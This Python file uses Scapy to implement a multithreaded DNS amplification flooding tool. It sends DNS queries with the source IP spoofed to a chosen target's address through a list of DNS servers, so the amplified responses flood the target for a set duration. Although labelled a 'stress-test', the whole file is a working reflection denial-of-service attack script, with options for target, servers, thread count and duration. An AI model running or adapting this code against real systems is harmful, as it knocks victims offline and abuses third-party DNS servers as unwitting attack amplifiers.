from scapy.all import *
import time
import random
import threading
import argparse

class FloodThread(threading.Thread):
    def __init__(self, thread_ID, name, dns_server, target):
        threading.Thread.__init__(self)
        self.thread_ID = thread_ID
        self.name = name
        self.dns_server = dns_server.split()
        self.target = target
        self.flag = True

    def run(self):
        print('Starting ' + self.name + ' (' + self.dns_server[0] + ')')
        while self.flag:
            self.dns_query()
        print('Exiting ' + self.name)

    def dns_query(self):
        source_port = random.randint(1025, 65534)
        ip = IP(src = self.target, dst = self.dns_server[0]) / UDP(sport = source_port, dport = 53)
        dns_request = DNS(rd = 1, qd = DNSQR(qname = self.dns_server[1], qtype = self.dns_server[2]))
        p = ip / dns_request
        send(p, inter = 0, verbose = 0)
        global packets
        packets += 1 
        global f_output
        f_output.write('Sending DNS-packet ' + str(self.name) 
                        + ' (IP: ' + str(self.dns_server[0]) 
                        + ' Port: ' + str(source_port) 
                        + ' Query type: ' + str(self.dns_server[2]) 
                        + ' Query: ' + str(self.dns_server[1]) + ')' 
                        + '\n')

def main(dns_servers, timeout, target, threads):
    print('Beginning of stress-test using DNS-amplification attack')
    print('Duration: ', timeout, ' с')
    flood_threads = []
    for i in range(threads):
        flood_threads.append(FloodThread(i, "Thread-" + str(i + 1), dns_servers[i % len(dns_servers)], target))
        flood_threads[i].start()
    timer = time.time() + timeout
    while True:
        if time.time() > timer:
            for i in range(len(flood_threads)):
                flood_threads[i].flag = False
                flood_threads[i].join()
            break

def read_servers(data_file):
    with open(data_file) as servers_file:
        ampl_data = [row.strip() for row in servers_file]
    return ampl_data

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-target', help = "Target's IP-address")
    parser.add_argument('-servers', help = 'List of DNS-servers with queries (Format: IP DNS_query Query_type)')
    parser.add_argument('-timeout', type = int, default = 10, help = 'Attack duration. 0 - infinite time (Default: 10s)')
    parser.add_argument('-threads', type = int, default = 20, help = 'Number of attacking threads (Default: 20)')
    args =  parser.parse_args()
    target = args.target
    dns_file = args.servers
    timeout = args.timeout
    threads = args.threads
    if (dns_file == None) or (target == None):
        print('Some arguments missing')
        parser.print_help()
        sys.exit(0)
    packets = 0 #global variable
    f_output = open('ampl_log.txt', 'w') #global variable
    servers = read_servers(dns_file)
    main(servers, timeout, target, threads)
    print('Stress-test is finished')
    print('Amount of sent packets: ' + str(packets))
    f_output.close()